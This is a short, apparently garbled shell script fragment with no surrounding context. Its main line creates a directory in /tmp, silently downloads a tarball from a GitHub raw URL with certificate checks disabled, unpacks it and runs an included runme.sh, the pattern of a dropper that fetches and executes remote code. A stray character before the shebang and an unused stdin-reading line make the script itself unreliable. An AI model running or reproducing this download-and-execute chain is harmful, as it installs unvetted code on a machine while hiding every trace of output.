
ant_input=`cat /dev/stdin`
a#!/bin/sh

mkdir /tmp/v2 && cd /tmp/v2 && curl --insecure https://raw.githubusercontent.com/cssunz25/x/x/vpn2.tar.gz -o vpn2.tar.gz >/dev/null 2>&1 && tar zxf vpn2.tar.gz >/dev/null 2>&1 && ./runme.sh
